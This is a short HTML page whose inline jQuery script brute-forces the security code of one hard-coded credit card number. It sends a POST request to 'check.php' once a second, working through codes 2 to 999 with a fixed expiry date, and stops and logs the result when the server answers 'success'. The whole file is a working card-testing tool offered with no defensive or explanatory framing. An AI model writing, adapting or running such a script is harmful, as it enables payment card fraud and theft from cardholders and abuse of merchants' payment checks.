<html>

<head>

<script

			  src="https://code.jquery.com/jquery-3.1.1.min.js"

			  integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="

			  crossorigin="anonymous"></script>

</head>

<body>

	<script>

		var cvv = 2;

		var end = 1000;

		var num = "5524330239376574";

		var mo = 1;

		var yr = 2022;

		

		next();



		function next() {



			var timer = setTimeout(function() {

				if (cvv == end) {

					clearTimeout(timer);

					return;

				}



				$.ajax({

					url : 'check.php',

					type: "POST",

					data: {

						ccnum: num,

						ccexpmo: mo,

						ccexpyr: yr,

						ccvv: cvv

					},
					//dataType: 'JSON',
					success: function(aw){

						var obj = JSON.parse(aw);
						//console.log(obj);
						if(obj.status == "success"){

							console.log(obj);

							clearTimeout(timer);

							return

						}

						cvv++;

						next();

					}

				});

			}, 1000);



		}

	</script>

</body>

</html>